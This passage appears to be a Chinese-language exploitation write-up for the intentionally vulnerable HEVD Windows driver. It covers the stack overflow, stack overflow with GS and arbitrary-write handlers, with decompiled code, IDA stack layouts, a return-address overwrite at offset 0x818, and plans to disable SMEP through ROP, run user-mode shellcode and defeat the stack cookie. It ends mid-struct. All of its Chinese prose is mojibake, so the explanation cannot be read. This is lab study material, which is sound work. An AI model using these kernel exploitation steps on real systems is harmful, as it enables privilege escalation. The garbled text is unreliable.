<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerBufferOverflowStack</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> KernelBuffer[<span class="number">512</span>]; <span class="comment">// [rsp+20h] [rbp-818h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(KernelBuffer));</span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserBuffer, <span class="number">0x800</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, KernelBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x800</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memmove</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>ProbeForRead</strong>Â ä¾‹ç¨‹æ£€æŸ¥ç”¨æˆ·æ¨¡å¼ç¼“å†²åŒºæ˜¯å¦å®é™…é©»ç•™åœ¨åœ°å€ç©ºé—´çš„ç”¨æˆ·éƒ¨åˆ†ï¼Œå¹¶ä¸”æ˜¯å¦æ­£ç¡®å¯¹é½ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ProbeForRead</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">const</span> <span class="keyword">volatile</span> VOID *Address,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T              Length,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG               Alignment</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ä»æ±‡ç¼–çœ‹ï¼Œä¸å­˜åœ¨cookieï¼Œå¹¶ä¸”å­˜åœ¨exceptionä¿¡æ¯</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAGE:<span class="number">00000001400866</span>AE                 call    memmove</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>3                 jmp     <span class="type">short</span> loc_1400866D0</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>3 ;   &#125; <span class="comment">// starts at 14008661E</span></span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 $LN6_0:                                 ; DATA XREF: .rdata:<span class="number">000000014000269</span>Câ†‘o</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5 ;   __except(<span class="number">1</span>) <span class="comment">// owned by 14008661E</span></span><br><span class="line">PAGE:<span class="number">00000001400866B</span>5                 mov     ebx, eax</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>7                 mov     r9d, eax</span><br><span class="line">PAGE:<span class="number">00000001400866B</span>A                 lea     r8, aExceptionCode0 ; <span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span></span><br><span class="line">PAGE:<span class="number">00000001400866</span>C1                 mov     edx, <span class="number">3</span>          ; Level</span><br><span class="line">PAGE:<span class="number">00000001400866</span>C6                 lea     ecx, [Size+<span class="number">4</span>Ah] ; ComponentId</span><br><span class="line">PAGE:<span class="number">00000001400866</span>C9                 call    cs:__imp_DbgPrintEx</span><br><span class="line">PAGE:<span class="number">00000001400866</span>CF                 nop</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0 loc_1400866D0:                          ; CODE XREF: TriggerBufferOverflowStack+CFâ†‘j</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D0                 mov     eax, ebx</span><br><span class="line">PAGE:<span class="number">00000001400866</span>D2                 lea     r11, [rsp+<span class="number">838</span>h+var_18]</span><br><span class="line">PAGE:<span class="number">00000001400866</span>DA                 mov     rbx, [r11+<span class="number">20</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866</span>DE                 mov     rsi, [r11+<span class="number">28</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866E2</span>                 mov     rdi, [r11+<span class="number">30</span>h]</span><br><span class="line">PAGE:<span class="number">00000001400866E6</span>                 mov     rsp, r11</span><br><span class="line">PAGE:<span class="number">00000001400866E9</span>                 pop     r15</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EB                 pop     r14</span><br><span class="line">PAGE:<span class="number">00000001400866</span>ED                 pop     r12</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EF                 retn</span><br><span class="line">PAGE:<span class="number">00000001400866</span>EF ; &#125; <span class="comment">// starts at 1400865E4</span></span><br></pre></td></tr></table></figure>


<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šè¿”å›åœ°å€åç§»ï¼ŒIDAæ ‡è®°äº†è¿”å›åœ°å€çš„åœ°å€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-0000000000000818 KernelBuffer    <span class="built_in">dd</span> 512 dup(?)</span><br><span class="line">-0000000000000018 var_18          db ?</span><br><span class="line">-0000000000000017                 db ? ; undefined</span><br><span class="line">-0000000000000016                 db ? ; undefined</span><br><span class="line">-0000000000000015                 db ? ; undefined</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined</span><br><span class="line">-0000000000000010                 db ? ; undefined</span><br><span class="line">-000000000000000F                 db ? ; undefined</span><br><span class="line">-000000000000000E                 db ? ; undefined</span><br><span class="line">-000000000000000D                 db ? ; undefined</span><br><span class="line">-000000000000000C                 db ? ; undefined</span><br><span class="line">-000000000000000B                 db ? ; undefined</span><br><span class="line">-000000000000000A                 db ? ; undefined</span><br><span class="line">-0000000000000009                 db ? ; undefined</span><br><span class="line">-0000000000000008                 db ? ; undefined</span><br><span class="line">-0000000000000007                 db ? ; undefined</span><br><span class="line">-0000000000000006                 db ? ; undefined</span><br><span class="line">-0000000000000005                 db ? ; undefined</span><br><span class="line">-0000000000000004                 db ? ; undefined</span><br><span class="line">-0000000000000003                 db ? ; undefined</span><br><span class="line">-0000000000000002                 db ? ; undefined</span><br><span class="line">-0000000000000001                 db ? ; undefined</span><br><span class="line">+0000000000000000  r              db 8 dup(?)</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•ä¸€ä¸‹ï¼Œç¡®å®å¦‚æ­¤</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RtlFillMemory</span>(lpBuffer, <span class="number">0x1000</span>, <span class="number">0x43</span>);</span><br><span class="line">PDWORD64 rop = (PDWORD64)((PCHAR)lpBuffer + <span class="number">0x818</span>);</span><br><span class="line">*rop = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>: kd&gt; r rsp</span><br><span class="line">rsp=fffff3082725a708</span><br><span class="line"><span class="number">4</span>: kd&gt; t</span><br><span class="line"><span class="number">00000000</span>`deadbeef ??              ???</span><br></pre></td></tr></table></figure>

<p>å› æ­¤</p>
<ul>
<li>ROPå…³é—­SMEP&#x2F;SMAP</li>
<li>è·³è½¬åˆ°ç”¨æˆ·æ€è¿›è¡Œæ‰§è¡Œshellcode</li>
</ul>
<h2 id="With-GS"><a href="#With-GS" class="headerlink" title="With GS"></a>With GS</h2><p>codeå¦‚ä¸‹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222007</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">BufferOverflowStackGSIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> LABEL_64;</span><br></pre></td></tr></table></figure>

<p>ä¸åŒç‚¹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerBufferOverflowStackGS</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 KernelBuffer[<span class="number">512</span>]; <span class="comment">// [rsp+20h] [rbp-238h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(KernelBuffer));</span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserBuffer, <span class="number">0x200</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, KernelBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x200</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack (GS)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memmove</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹æ±‡ç¼–å¯ä»¥çœ‹å‡ºæ¥å­˜åœ¨cookieçš„æ¯”è¾ƒ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAGE:<span class="number">00000001400867E4</span>                 call    memmove</span><br><span class="line">PAGE:<span class="number">00000001400867E9</span>                 jmp     <span class="type">short</span> loc_140086806</span><br><span class="line">PAGE:<span class="number">00000001400867E9</span> ;   &#125; <span class="comment">// starts at 140086754</span></span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB $LN6_1:                                 ; DATA XREF: .rdata:<span class="number">00000001400026</span>D0â†‘o</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB ;   __except(<span class="number">1</span>) <span class="comment">// owned by 140086754</span></span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB                 mov     ebx, eax</span><br><span class="line">PAGE:<span class="number">00000001400867</span>ED                 mov     r9d, eax</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>0                 lea     r8, aExceptionCode0 ; <span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span></span><br><span class="line">PAGE:<span class="number">00000001400867F</span>7                 mov     edx, <span class="number">3</span>          ; Level</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>C                 lea     ecx, [Size+<span class="number">4</span>Ah] ; ComponentId</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>F                 call    cs:__imp_DbgPrintEx</span><br><span class="line">PAGE:<span class="number">0000000140086805</span>                 nop</span><br><span class="line">PAGE:<span class="number">0000000140086806</span></span><br><span class="line">PAGE:<span class="number">0000000140086806</span> loc_140086806:                          ; CODE XREF: TriggerBufferOverflowStackGS+D9â†‘j</span><br><span class="line">PAGE:<span class="number">0000000140086806</span>                 mov     eax, ebx</span><br><span class="line">PAGE:<span class="number">0000000140086808</span>                 mov     UserBuffer, [rsp+<span class="number">258</span>h+var_38]</span><br><span class="line">PAGE:<span class="number">0000000140086810</span>                 <span class="keyword">xor</span>     UserBuffer, rsp ; StackCookie</span><br><span class="line">PAGE:<span class="number">0000000140086813</span>                 call    __security_check_cookie</span><br><span class="line">PAGE:<span class="number">0000000140086818</span>                 mov     rbx, [rsp+<span class="number">258</span>h+arg_10]</span><br><span class="line">PAGE:<span class="number">0000000140086820</span>                 add     rsp, <span class="number">230</span>h</span><br><span class="line">PAGE:<span class="number">0000000140086827</span>                 pop     r15</span><br><span class="line">PAGE:<span class="number">0000000140086829</span>                 pop     r14</span><br><span class="line">PAGE:<span class="number">000000014008682B</span>                 pop     r12</span><br><span class="line">PAGE:<span class="number">000000014008682</span>D                 pop     rdi</span><br><span class="line">PAGE:<span class="number">000000014008682</span>E                 pop     rsi</span><br><span class="line">PAGE:<span class="number">000000014008682F</span>                 retn</span><br></pre></td></tr></table></figure>

<p>GS: Cookie ç”¨äºåœ¨ä½¿ç”¨Â <a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/gs-buffer-security-check?view=msvc-170">&#x2F;GSï¼ˆç¼“å†²åŒºå®‰å…¨æ£€æŸ¥ï¼‰</a>ç¼–è¯‘çš„ä»£ç ä¸­å’Œä½¿ç”¨å¼‚å¸¸å¤„ç†çš„ä»£ç ä¸­æä¾›ç¼“å†²åŒºæº¢å‡ºä¿æŠ¤ã€‚ è¿›å…¥å—åˆ°æº¢å‡ºä¿æŠ¤çš„å‡½æ•°æ—¶ï¼ŒCookie è¢«ç½®äºå †æ ˆä¹‹ä¸Šï¼›é€€å‡ºæ—¶ï¼Œä¼šå°†å †æ ˆä¸Šçš„å€¼ä¸å…¨å±€ Cookie è¿›è¡Œæ¯”è¾ƒã€‚ å®ƒä»¬ä¹‹é—´å­˜åœ¨ä»»ä½•å·®å¼‚åˆ™è¡¨ç¤ºå·²ç»å‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œå¹¶å¯¼è‡´è¯¥ç¨‹åºçš„ç«‹å³ç»ˆæ­¢ã€‚</p>
<p>è¿™ä¸ªvar_38å°±æ˜¯cookieçš„å€¼ï¼Œæœ€åè¿›è¡Œä¸€ä¸ªæ¯”è¾ƒ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">-0000000000000238</span> KernelBuffer    db <span class="number">512</span> <span class="built_in">dup</span>(?)</span><br><span class="line"><span class="number">-0000000000000038</span> var_38          dq ?</span><br><span class="line"><span class="number">-0000000000000030</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000029</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000028</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000027</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000026</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000025</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000024</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000023</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000022</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000021</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000020</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000019</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000018</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000017</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000016</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000015</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000014</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000013</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000012</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000011</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000010</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000009</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000008</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000007</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000006</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000005</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000004</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000003</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000002</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000001</span>                 db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000000</span>  r              db <span class="number">8</span> <span class="built_in">dup</span>(?)</span><br></pre></td></tr></table></figure>

<p>å…¶åˆå§‹åŒ–è¿‡ç¨‹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAGE:<span class="number">0000000140086724</span>                 mov     rax, cs:__security_cookie</span><br><span class="line">PAGE:<span class="number">000000014008672B</span>                 <span class="keyword">xor</span>     rax, rsp</span><br><span class="line">PAGE:<span class="number">000000014008672</span>E                 mov     [rsp+<span class="number">258</span>h+var_38], rax</span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡cookieçš„æ€è·¯ï¼š</p>
<ul>
<li>åœ¨x86ä¸‹å¯ä»¥é€šè¿‡ä¿®æ”¹ SEH ä¸­çš„ exception handler åœ°å€å¹¶è§¦å‘å¼‚å¸¸æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•åœ¨è¿™é‡Œå¹¶ä¸å¯è¡Œï¼Œå› ä¸ºç¯å¢ƒæ˜¯ 64 ä½ç³»ç»Ÿï¼Œè€Œåªæœ‰ 32 ä½ç³»ç»Ÿçš„ SEH ä¿¡æ¯ä¿å­˜åœ¨æ ˆä¸­ï¼Œ64 ä½ç³»ç»Ÿçš„ SEH ä¸åœ¨æ ˆä¸Š<a href="https://sup817ch.github.io/2020/09/04/Windows-x64-SEH%E7%AC%94%E8%AE%B0/">(1)</a>ã€‚å› æ­¤æ— æ³•ä½¿ç”¨ SEH è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚</li>
<li>ä¿®æ”¹ .data å’Œ æ ˆä¸Šå­˜å‚¨çš„ cookie å€¼ã€‚è¦åšåˆ°è¿™ç‚¹ï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªä»»æ„å†™æ¼æ´ï¼Œè€Œ HEVD æ˜¾ç„¶æ˜¯æœ‰è¿™ä¸ªæ¼æ´çš„ï¼Œå°±åœ¨Â <code>TriggerArbitraryWrite</code>Â å‡½æ•°ä¸­ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ­¤æ¬¡æ¼æ´å‡½æ•°ä¸­è¿˜é¢å¤–å¯¹ security_cookie è¿›è¡Œäº†ä¸€æ¬¡æ ˆé¡¶çš„å¼‚æˆ–æ“ä½œï¼Œå› æ­¤è¿˜è¦è·å–æ ˆé¡¶çš„æ•°å€¼</li>
<li>è¦†ç›–è™šå‡½æ•°æŒ‡é’ˆ æ¡ä»¶ï¼šå‡½æ•°å‚æ•°ä¸­æœ‰å¯¹è±¡æˆ–ç»“æ„ä½“çš„æŒ‡é’ˆï¼›å‚æ•°æ˜¯æ”¾åœ¨æ ˆä¸Šçš„ã€‚ç”±äºæµ‹è¯•ç¯å¢ƒæ˜¯ 64 ä½ç³»ç»Ÿï¼Œå‚æ•°ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œå› æ­¤ä¸è€ƒè™‘ã€‚</li>
<li>è¯»å– cookie æ•°å€¼å¹¶è®¡ç®—å‡º xored security_cookie æ•°å€¼ éœ€è¦ä¸€ä¸ªä»»æ„è¯»æ¼æ´è¯»å– cookie çš„æ•°å€¼ï¼Œä»¥åŠæƒ³åŠæ³•è·å–è®¡ç®— xored security_cookie æ—¶ RSP å¯„å­˜å™¨çš„æ•°å€¼ã€‚</li>
</ul>
<p>å¦‚ä½•è·å–rspçš„å€¼ï¼Ÿ</p>
<p>é¦–å…ˆåˆ©ç”¨Â <code>NtQuerySystemInformation</code>Â å‡½æ•°è·å–å½“å‰è¿›ç¨‹çš„Â <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code>Â ä¿¡æ¯ï¼Œè¯¥ä¿¡æ¯ä¸­åŒ…å«äº†è¿›ç¨‹ä¸­æ¯ä¸ªçº¿ç¨‹çš„ StackBase å’Œ StackLimit ä¿¡æ¯ï¼ŒStackBase è¡¨ç¤ºæ ˆçš„èµ·å§‹åœ°å€ï¼ŒStackLimit è¡¨ç¤ºæ ˆèŒƒå›´å†…å¯åˆ†é…çš„æœ€å°åœ°å€ï¼Œç”±äºæ ˆç©ºé—´æ˜¯å‘ä¸‹åˆ†é…çš„ï¼Œå› æ­¤ StackBase çš„æ•°å€¼å¤§äº StackLimit çš„æ•°å€¼ã€‚</p>
<p>what to where: å…¶å®æ˜¯ä»»æ„åœ°å€è¯»å†™ã€‚</p>
<ul>
<li>whereå†…æ ¸åœ°å€ï¼Œwhatå†™æ•°æ® &#x3D;&gt; ä»»æ„å†™</li>
<li>whereæ˜¯ç”¨æˆ·bufferï¼Œwhatæ˜¯å†…æ ¸åœ°å€ &#x3D;&gt; ä»»æ„è¯»</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22200B</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">ArbitraryWriteIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerArbitraryWrite</span><span class="params">(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *What; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *Where; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserWriteWhatWhere, <span class="number">0x10</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  What = UserWriteWhatWhere-&gt;What;</span><br><span class="line">  Where = UserWriteWhatWhere-&gt;Where;</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span>, UserWriteWhatWhere);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] WRITE_WHAT_WHERE Size: 0x%zX\n&quot;</span>, <span class="number">0x10</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;</span>, What);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;</span>, Where);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Arbitrary Write\n&quot;</span>);</span><br><span class="line">  *Where = *What;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨NtQuerySystemInformation(ZwQuerySystemInformation)è·å¾—å†…æ ¸ä¿¡æ¯</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out]       PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>SYSTEM_INFORMATION_CLASS</code>æ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œ<a href="https://blog.csdn.net/weixin_42270114/article/details/125803630">æ–‡ç« </a>å­˜åœ¨è¿™ä¸ªç»“æ„ä½“ï¼Œæˆ‘ä»¬å…³å¿ƒå¦‚ä¸‹çš„ä¸€ä¸ªå°±è¡Œ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;</span><br><span class="line">	SystemExtendedProcessInformation = <span class="number">0x39</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br></pre></td></tr></table></figure>

<p><code>SystemInformation</code> æ˜¯æŸ¥è¯¢ç»“æœ</p>
<p><code>SystemInformationLength</code>æ˜¯SystemInformationç¼“å†²åŒºå¤§å°</p>
<p><code>ReturnLength</code>è¿”å›å®é™…å¤§å°ï¼Œå¦‚æœå¤§äº<code>SystemInformationLength</code>å‡½æ•°è°ƒç”¨ä¼šå¤±è´¥</p>
<p>ç›¸å…³åˆ©ç”¨ï¼š<a href="https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda">List process information including process architecture and username</a></p>
<p>æŸ¥è¯¢çš„ç»“æœæ˜¯ <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_EXTENDED_PROCESS_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG NextEntryOffset;</span><br><span class="line">	ULONG NumberOfThreads;</span><br><span class="line">	LARGE_INTEGER SpareLi1;</span><br><span class="line">	LARGE_INTEGER SpareLi2;</span><br><span class="line">	LARGE_INTEGER SpareLi3;</span><br><span class="line">	LARGE_INTEGER CreateTime;</span><br><span class="line">	LARGE_INTEGER UserTime;</span><br><span class="line">	LARGE_INTEGER KernelTime;</span><br><span class="line">	UNICODE_STRING ImageName;</span><br><span class="line">	KPRIORITY BasePriority;</span><br><span class="line">	ULONG ProcessId;</span><br><span class="line">	ULONG InheritedFromUniqueProcessId;</span><br><span class="line">	ULONG HandleCount;</span><br><span class="line">	ULONG SessionId;</span><br><span class="line">	PVOID 